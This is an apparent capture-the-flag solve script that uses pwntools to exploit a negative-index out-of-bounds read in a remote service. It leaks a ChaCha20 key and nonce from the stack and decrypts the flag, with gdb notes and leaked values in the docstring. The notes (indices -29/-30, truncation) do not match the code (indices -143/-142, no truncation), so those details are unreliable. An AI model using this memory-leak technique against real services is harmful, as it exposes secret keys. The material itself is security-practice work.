from Crypto.Cipher import ChaCha20
from pwn import *
import os
import sys

"""
find beginning of key by chacha prefix:
find /w 0x7fffffffd750, 0x7fffffffda30,  0x6b206574

pos key: 0x7fffffffd8ec

pos ciphertext_store: 0x7fffffffdca0

Stack offset between ciphertext_store and leaked key is 948B.
Thats why we have to leak twice, once with index -29 and once with -30. Output is 32 bytes long.
Output has to be truncated, but can then directly be used as key and nonce.

From gdb:
0x43250c65  0x5edc7e0b  0xc1ab49d3 0x1d8400c1
0xb1e60b7f  0xcc597196  0xd693ffb4 0x50afde3f
0x357ed57f  0x59dbf325

From leaks:
Leaked(index -30, prefix and first 16B of key): 657870616e642033322d62797465206b96602c5c8f10c6cf46e7f7a97c681924
Leaked(index -29, second 16B of key and nonce): 2a9b15bd71fe738fd842cbc76ff98e0069fcb2b1c095363ca0dcffffff7f0000

Ciphertext: e0031e5adfdfd540e9a9ea8ac504f48ba47f353cf0aecbe188e682d45ca3f2ec
"""


r = remote(sys.argv[1], sys.argv[2])

def read_ct(index):
    r.recvuntil(b"Encrypt a plaintext.")
    r.sendline(b"1")
    r.recvuntil(b"Which ciphertext would you like to read [0-9]?")
    r.sendline(str(index).encode())
    r.recvuntil(b"Ciphertext: ")
    ciphertext = r.recvline()
    return ciphertext.strip().decode()

ciphertext = read_ct(0)
print(f"ciphertext: {ciphertext}")

key_start = read_ct(-143)

print(f"recovered partial key: {key_start}")

key_end = read_ct(-142)
key = key_start
nonce = key_end[:16]
print(f"recovered full key: {key}")
print(f"recovered nonce: {nonce}")

key = bytes.fromhex(key)
nonce = bytes.fromhex(nonce)

ct = bytes.fromhex(ciphertext)

c = ChaCha20.new(key=key, nonce=nonce)
print("Flag: ", c.decrypt(ct))
